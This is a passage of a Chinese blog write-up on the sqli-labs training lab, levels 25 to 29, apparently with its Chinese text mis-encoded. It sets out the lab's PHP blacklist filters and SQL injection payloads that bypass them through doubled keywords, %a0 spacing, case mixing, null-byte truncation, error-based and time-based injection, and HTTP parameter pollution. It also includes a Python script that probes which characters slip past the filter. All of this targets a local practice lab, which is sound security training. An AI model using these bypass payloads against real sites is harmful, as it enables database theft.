class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç å¯ä»¥åŒå†™ç»•è¿‡<br>ç®€å•æµ‹è¯•ï¼Œä¸å±•å¼€äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">çˆ†å­—æ®µ</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">25</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; oorrder by 4%23</span></span><br><span class="line"><span class="string">çˆ†åº“å</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-25/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,database()%<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="level-25a"><a href="#level-25a" class="headerlink" title="level-25a"></a>level-25a</h3><p><strong>è¿‡æ»¤or&#x2F;and-æ—¶é—´ç›²æ³¨</strong><br>å› ä¸ºæ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œåªèƒ½æ—¶é—´ç›²æ³¨ï¼Œå’Œlevel-25ç±»ä¼¼ï¼Œä¸ç»†è‡´å±•å¼€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-25a/?<span class="built_in">id</span>=<span class="number">1</span> oorr <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">3</span>),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="level-26"><a href="#level-26" class="headerlink" title="level-26"></a>level-26</h3><p><strong>è¿‡æ»¤-æŠ¥é”™æ³¨å…¥</strong><br>å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (å¤§å°å†™ä¸æ•æ„Ÿ)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out ç©ºæ ¼</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out /\</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é—®é¢˜åœ¨äºç©ºæ ¼æ€ä¹ˆç»•è¿‡ï¼Œå¯ä»¥ç”¨%a0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data </span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">26</span>/?<span class="built_in">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0oorr%a0updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)%a0oorr%<span class="number">20</span>%<span class="number">27</span></span><br><span class="line"></span><br><span class="line">åç«¯å¤„ç†å</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;1&#x27;</span>ï¿½<span class="keyword">or</span>ï¿½updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)ï¿½o<span class="string">r&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•å¯ä»¥æ›¿ä»£ç©ºæ ¼çš„å­—ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">test=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(i)))</span><br><span class="line">    tmp=<span class="built_in">str</span>(<span class="built_in">hex</span>(i)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">3</span>:</span><br><span class="line">        tmp=tmp.replace(<span class="string">&quot;%&quot;</span>,<span class="string">&quot;%0&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-26/?id=1%27%a0oorr&quot;</span>+tmp+<span class="string">&quot;1%a0oorr%20%27&quot;</span></span><br><span class="line">    r=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Dumb&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        test=test+<span class="string">&quot; &quot;</span>+tmp</span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<br><code> %0b %21 %2b %40 %7e %a0</code><br>ä¹Ÿå¯ä»¥ç”¨éš”æ–­ï¼Œåªä¸è¿‡ç©ºæ ¼æ›¿æ¢ï¼Œå…³é”®å­—æ›¿æ¢å°±å¯ä»¥äº†<br>å‚è€ƒï¼š<br><a href="https://www.jianshu.com/p/ff72f2c6d99c">Sqli-Labsï¼šLess 26 - Less 26a</a></p><h3 id="level-26a"><a href="#level-26a" class="headerlink" title="level-26a"></a>level-26a</h3><p><strong>æ—¶é—´ç›²æ³¨</strong><br>ç±»ä¼¼level-26ï¼Œä¸è¿‡åŠ äº†æ‹¬å·ï¼Œä»¥åŠæŠ¥é”™æ²¡äº†,è¿™é‡Œç”¨äº†%00æˆªæ–­ï¼Œä¹Ÿæ˜¯å¯¹ä¸Šé¢çš„è¡¥å……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-26a/?<span class="built_in">id</span>=k<span class="string">&#x27;)%a0oorr%a0if(length(database())=8,sleep(3),1);%00</span></span><br></pre></td></tr></table></figure><h3 id="level-27"><a href="#level-27" class="headerlink" title="level-27"></a>level-27</h3><p><strong>ç®€å•è¿‡æ»¤ç»•è¿‡-å•å¼•å·-æŠ¥é”™-å¤§å°å†™ç»•è¿‡</strong><br>å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/u è¡¨ç¤ºæŒ‰<span class="title function_ invoke__">unicode</span>(utf-<span class="number">8</span>)åŒ¹é…ï¼ˆä¸»è¦é’ˆå¯¹å¤šå­—èŠ‚æ¯”å¦‚æ±‰å­—ï¼‰</span><br><span class="line">/i è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼ˆå¦‚æœè¡¨è¾¾å¼é‡Œé¢æœ‰ aï¼Œ é‚£ä¹ˆ A ä¹Ÿæ˜¯åŒ¹é…å¯¹è±¡ï¼‰</span><br><span class="line">/s è¡¨ç¤ºå°†å­—ç¬¦ä¸²è§†ä¸ºå•è¡Œæ¥åŒ¹é…</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ å•å¼•å·<br><code>http://127.0.0.1/sqli-labs/Less-27/?id=1&#39;</code><br>å¾—åˆ°æŠ¥é”™<br><code>use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code><br>è¯´æ˜åå°å°±æ˜¯åŠ äº†å•å¼•å·<br>1ã€unionæ³¨å…¥ï¼Œä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œ%a0ä»£æ›¿ç©ºæ ¼ï¼Œ%00æˆªæ–­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">27</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;%a0unIon%a0selEct%a01,2,3;%00</span></span><br><span class="line"><span class="string">åç«¯æ‹¼æ¥å</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=&#x27;</span>a<span class="string">&#x27;ï¿½unIonï¿½selEctï¿½1,2,3;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><p>2ã€æŠ¥é”™æ³¨å…¥ï¼Œä½¿ç”¨||æ›¿æ¢orï¼Œ%a0æ›¿æ¢ç©ºæ ¼ã€‚%00æˆªæ–­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">27</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;%a0||%a0updatexml(1,concat(0x7e,(database()),0x7e),1);%00</span></span><br></pre></td></tr></table></figure><h3 id="level-27a"><a href="#level-27a" class="headerlink" title="level-27a"></a>level-27a</h3><p><strong>ç®€å•è¿‡æ»¤ç»•è¿‡-åŒå¼•å·-ç›²æ³¨-å¤§å°å†™ç»•è¿‡</strong><br>ç±»ä¼¼level-27,ä¸è¿‡æ¢äº†åŒå¼•å·ï¼Œæ²¡äº†æŠ¥é”™<br>1ã€unionæ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-27a/?<span class="built_in">id</span>=a<span class="string">&quot;%a0unIon%a0selEct%a01,2,3;%00</span></span><br></pre></td></tr></table></figure><p>2ã€boolç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-27a/?<span class="built_in">id</span>=a<span class="string">&quot; %a0||%a0if(1,sleep(3),1);%00</span></span><br></pre></td></tr></table></figure><h3 id="level-28"><a href="#level-28" class="headerlink" title="level-28"></a>level-28</h3><p><strong>æ— æŠ¥é”™-å•æ‹¬å·-å•å¼•å·-ç»•è¿‡</strong><br>å…³é”®ä»£ç    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($<span class="built_in">id</span>)</span><br><span class="line">&#123;</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);//strip out /*</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);//Strip out --.</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);//Strip out <span class="comment">#.</span></span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br><span class="line">//$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br><span class="line">æŸ¥æ‰¾å¾—åˆ°ï¼Œ</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out UNION &amp; SELECT. è¿™ä¸ªæ²¡çœ‹æ‡‚ä»€ä¹ˆæ„æ€ï¼Œè¿™å¥è¯è¿‡æ»¤äº†ç›¸è¿çš„unionå’Œselectï¼Œ/iåŒæ—¶åŒ¹é…å¤§å°å†™ï¼Œ\såŒ¹é…ä»»æ„ç©ºç™½å­—ç¬¦å¦‚åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ã€</span><br><span class="line"><span class="keyword">return</span> $<span class="built_in">id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1ã€unionæ³¨å…¥ï¼Œ%a0æ›¿æ¢ç©ºæ ¼ï¼Œ%00æˆªæ–­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">28</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;)%a0union%a0select%a01,2,3;%00</span></span><br><span class="line"><span class="string">åç«¯</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=(&#x27;</span>a<span class="string">&#x27;)ï¿½unionï¿½selectï¿½1,2,3;&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span> //å‰é¢ä¸æ˜¯è¿‡æ»¤union selectäº†å—ï¼Œä½†æ˜¯è¿™é‡Œçœ‹å¹¶æ²¡æœ‰ï¼Œç©ºæ ¼ç­‰ï¼Œä½¿ç”¨%a0å¯ä»¥ç»•è¿‡ï¼Œ%a0ä¸ç®—ç©ºç™½ç¬¦ï¼Ÿ</span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><p>2ã€æ—¶é—´ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">28</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;)%a0||%a0if(length(database())=8,sleep(3),null);%00</span></span><br><span class="line"><span class="string">åç«¯</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=(&#x27;</span>a<span class="string">&#x27;)ï¿½||ï¿½if(length(database())=3,sleep(3),null);&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">ä¼šsllep <span class="number">3</span> ç§’</span><br></pre></td></tr></table></figure><h3 id="level-28a"><a href="#level-28a" class="headerlink" title="level-28a"></a>level-28a</h3><p>å…³é”®ä»£ç ,åªè¿‡æ»¤äº†<code>union select</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br></pre></td></tr></table></figure><p>ç»•è¿‡å°±ä½¿ç”¨<code> union union select select</code><br>ä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-28a/?<span class="built_in">id</span>=a<span class="string">&#x27;) union union select select 1,2,3 %23</span></span><br><span class="line"><span class="string">æ‹¼æ¥å</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=(&#x27;</span>a<span class="string">&#x27;) union select 1,2,3 #&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="level-29"><a href="#level-29" class="headerlink" title="level-29"></a>level-29</h3><p><strong>WAFç®€å•ç»•è¿‡-å‚æ•°è§£æ-å•å¼•å·</strong><br>å®‰è£…tomcat<br>è¿™é‡Œéœ€è¦å®‰è£…tomcatæä¾›ç®€å•çš„wafåŠŸèƒ½<br>åœ¨å·²ç»jdkçš„æƒ…å†µä¸‹ï¼Œåœ¨tomcatå®˜ç½‘ä¸‹è½½æœ€æ–°çš„å¯¹åº”å®‰è£…åŒ…ï¼Œåœ¨æ­¤ä»¥winä¸ºä¾‹<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-20-20.png"><br>æ‰¾ä¸ªä½ç½®è§£å‹ï¼Œç„¶åé…ç½®ç¯å¢ƒå˜é‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åœ¨<span class="string">&quot;ç³»ç»Ÿå˜é‡&quot;</span>é‡Œæ–°å»ºå˜é‡åï¼šCATALINA_BASEï¼Œå˜é‡å€¼ï¼šä¾‹ï¼ŒD:\JavaEE\apache-tomcatï¼ˆæ­¤å¤„ä¸ºä½ çš„è§£å‹åŒ…è·¯å¾„ï¼‰</span><br><span class="line">åœ¨<span class="string">&quot;ç³»ç»Ÿå˜é‡&quot;</span>é‡Œæ–°å»ºå˜é‡åï¼šCATALINA_HOMEï¼Œå˜é‡å€¼ï¼šåŒä¸Šï¼ˆæ­¤å¤„ä¸ºä½ çš„è§£å‹åŒ…è·¯å¾„ï¼‰</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨binä¸‹åŒå‡»startup.batå³å¯<br>ç„¶åè®¿é—®<a href="http://localhost:8080/">http://localhost:8080/</a><br>å¯ä»¥åœ¨confæ–‡ä»¶å¤¹é‡Œçš„server.xmlä¿®æ”¹ç«¯å£<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-32-21.png"><br>ç„¶åä¸‹è½½<a href="https://dev.mysql.com/downloads/connector/j/"><code>mysql-connector-java.jar</code></a>ï¼Œé€‰æ‹©å¯¹åº”ç‰ˆæœ¬<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-23-14.png"><br>ä¸‹è½½åæŠŠå‹ç¼©åŒ…è§£å‹çš„jaråŒ…ï¼Œæ”¾åˆ°tomcatä¸‹çš„lib<br>ç„¶åä½¿ç”¨IDEAå¯¼å…¥MySQLé©±åŠ¨åŒ…ï¼ŒæŠŠtomcatåŠ è½½åˆ°IDEAï¼Œç„¶åæ‰¾åˆ°libå³é”®<code>add library</code><br><img src="/2022/02/17/sqli-labs/2022-02-23-18-35-57.png"><br>ç„¶åå†æŠŠsqli-labsä¸‹çš„tomcat-filesè§£å‹åˆ°tomcatçš„webappsä¸‹<br>ç„¶åä¿®æ”¹level29-32ä¸‹çš„index.jspï¼ŒæŠŠè·³è½¬é“¾æ¥æ”¹æˆè‡ªå·±çš„sli-labs apacheæœåŠ¡é“¾æ¥ï¼Œä»¥æˆ‘çš„ä¸ºä¾‹<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-39-57.png"><br>ç„¶åå°±å¯ä»¥æµ‹è¯•äº†<br>å…³é”®ä»£ç </p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">rex</span> <span class="operator">=</span> <span class="string">&quot;^\\d+$&quot;</span>;   \d åŒ¹é…æ•°å­—</span><br><span class="line">Boolean match=id.matches(rex); WAFæ‰€åœ¨</span><br><span class="line"><span class="keyword">if</span>(match == <span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»•è¿‡çš„åŸç†æ˜¯æ ¹æ®tomcatä¸apacheåŒåå‚æ•°çš„çš„è§£ææ–¹å¼ä¸åŒ<br>ã€ŠMySQLæ³¨å…¥å¤©ä¹¦ï¼šLess 29ã€‹<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-54-43.png"><br>åœ¨index.jspï¼ŒåŠ å…¥å¦‚ä¸‹ä»£ç ï¼ŒæŸ¥çœ‹tomcatè§£æçš„idå€¼</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">out.print(<span class="string">&quot;&lt;font color= &#x27;#FFFF00&#x27;&gt;&quot;</span>);</span><br><span class="line">out.print(id);</span><br><span class="line">out.print(<span class="string">&quot;&lt;/font&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œindex.jsp?id&#x3D;1&amp;id&#x3D;2ï¼Œåœ¨tomcatè§£ææ—¶ï¼Œid&#x3D;1ï¼Œè€Œapacheä¸‹å°±æ˜¯2,è€Œapacheæ˜¯æˆ‘ä»¬çœŸæ­£è¦æ³¨å…¥çš„ã€‚<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-59-44.png"><br>å¯ä»¥çœ‹åˆ°ç»tomcatè§£æï¼Œid&#x3D;1ï¼Œè€Œåœ¨apacheè§£æåid&#x3D;2,å› ä¸º<br><img src="/2022/02/17/sqli-labs/2022-02-23-19-02-53.png">   </p><p>å°±æ˜¯æˆ‘ä»¬ç¬¬ä¸€ä¸ªidæ˜¯æ­£å¸¸æ•°æ®ï¼Œå°±å¯ä»¥é¥¶è¿‡wafäº†ï¼Œç¬¬äºŒä¸ªidæˆ‘ä»¬å°±å¯ä»¥å‘æŒ¥æƒ³è±¡äº†<br>ä»…åšç®€å•æ¼”ç¤º</p><p><img src="/2022/02/17/sqli-labs/2022-02-23-19-06-47.png"></p><p>å‚è€ƒï¼š</p><p><a href="https://www.jianshu.com/p/46cb6c354de5">Sqli-Labsï¼šLess 29 - Less 31</a><br><a href="https://blog.csdn.net/m0_37292262/article/details/80622840">Windows10ä¸Šå®‰è£…Apache Tomcat 9 è¯¦ç»†æ•™ç¨‹ï¼ˆäº²æµ‹ç»å¯¹æœ‰æ•ˆï¼‰</a><br><a 